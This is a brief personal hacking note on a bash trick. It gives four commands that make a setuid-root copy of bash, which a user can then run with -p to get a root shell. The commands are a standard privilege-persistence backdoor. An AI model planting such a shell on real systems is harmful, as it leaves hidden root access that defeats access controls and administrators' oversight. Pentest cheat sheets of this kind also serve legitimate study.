is:: [[note]]
from:: [[hacking]]

# Notes
Tricks with bash shell for hacking

## Setuid Bash
Create a copy of bash that always runs as root
```
cp _bin_bash _tmp_foobash
chown root:root _tmp_foobash
chmod 4755 _tmp_foobash
_tmp_foobash -p (as user)
```
